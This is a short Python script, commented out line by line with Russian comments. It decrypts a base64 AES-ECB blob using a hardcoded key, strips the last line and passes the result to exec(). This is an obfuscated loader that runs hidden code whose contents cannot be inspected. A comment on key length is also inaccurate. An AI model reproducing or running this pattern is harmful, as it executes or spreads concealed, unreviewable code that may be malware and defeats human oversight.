from Crypto.Cipher import AES
import base64

# Установите ключ 256 бит
#key = b'\xba\xd7~.\xb44J\x1eY\x9e1:\xfa-\xa4x\x0e\xcf\xe1\xee_\x84\xac\xc3\xe42\xcac\xecz\xc3\xf4'  # Используйте 16, 24 или 32 байта для AES-256 (16*8 = 256 бит)

# Инициализируйте дешифровщик AES с ключом
#cipher = AES.new(key, AES.MODE_ECB)

# Закодированный текст, который нужно дешифровать
#encrypted_text = b'1isWy1URGQWfh5glYrUbBDLpg04JF8jw6Pwdy4+yxb1x3kd2nxWVSBZ5XZnmxiXWq2RHO4WCvEnjZG37br/ojr5Pes8+ti8RzdBo5O+l/MnhSFcj/NGqfrh58a8qq4Z7Jkjz1oH4P7w3ryO4NMZHE0KAVbRDDdfdKfPP89LgnzEuAvH/xcjjQBbMZzbpNwN5E9Or13h+YveKAm+Rs+R1zIySLc/+68H7kVrqJcPZzAs='

# Дешифруйте текст
#decoded_text = base64.b64decode(encrypted_text)
#decrypted_text = cipher.decrypt(decoded_text)

# Выведите результат
#print(decrypted_text.decode('utf-8').split())

#dle = decrypted_text.decode('utf-8').split('\n')[-1]

#text = decrypted_text.decode('utf-8').replace(dle, "")

#exec(text)












